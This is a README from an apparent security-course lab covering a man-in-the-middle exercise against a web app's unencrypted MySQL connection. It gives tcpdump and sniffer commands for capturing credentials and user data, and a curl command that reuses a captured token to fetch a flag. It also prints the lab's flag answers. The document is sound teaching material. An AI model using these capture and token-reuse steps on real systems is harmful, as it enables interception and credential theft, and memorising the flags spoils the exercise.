## MITM Starter Template

This directory is a starter template for the MITM portion of the assignment.

### What you need to implement
- Capture traffic between the web app and database.
- Analyze packets for sensitive data and explain the impact.
- Record your findings.
- Include evidence (pcap files or screenshots) alongside your report.

### Getting started
1. Run your capture workflow from this directory or the repo root.
2. Save artifacts (pcap or screenshots) in this folder.
3. Document everything.

---

### Implementation Notes

**The vulnerability:** `web_app/app.py` connects to MySQL with
`ssl_disabled=True`. All queries and results are plaintext on port 3306.

**Capture methods:**
```bash
# Option A: tcpdump
sudo tcpdump -i br-<network_id> -A -s 0 'port 3306'

# Option B: custom sniffer (capture.py)
sudo python3 mitm/capture.py --interface br-<network_id>
```

**What was captured:**
- SQL queries in plaintext
- Full user table data
- Flag 1 (API token): `FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}`
- Database credentials in MySQL handshake

**Using Flag 1 to get Flag 3:**
```bash
curl http://172.20.0.21:8888/flag \
  -H "Authorization: Bearer FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}"
# Returns Flag 3: FLAG{p0rt_kn0ck1ng_4nd_h0n3yp0ts_s4v3_th3_d4y}
```

**Files:**
| File | Purpose |
|---|---|
| `capture.py` | Raw-socket MySQL sniffer + log analyzer |
| `README.md` | This file |
